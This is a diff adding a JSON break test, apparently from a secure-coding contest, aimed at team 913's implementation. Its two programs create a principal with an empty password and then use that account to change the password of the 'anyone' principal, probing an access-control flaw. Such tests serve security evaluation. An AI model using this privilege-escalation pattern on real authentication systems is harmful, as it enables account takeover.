@@ -1,0 +1,12 @@
+{
+    "type": "security",
+    "target_team": 913,
+    "arguments": {
+        "argv": ["%PORT%"],
+        "base64": false
+    },
+    "programs": [
+        {"program": "as principal admin password \"admin\" do\ncreate principal ab \"\"\nreturn \"x\"\n***\n", "base64": false},
+        {"program": "as principal ab password \"\" do\nchange password anyone \"\"\nreturn \"x\"\n***\n", "base64": false}
+ ]
+}
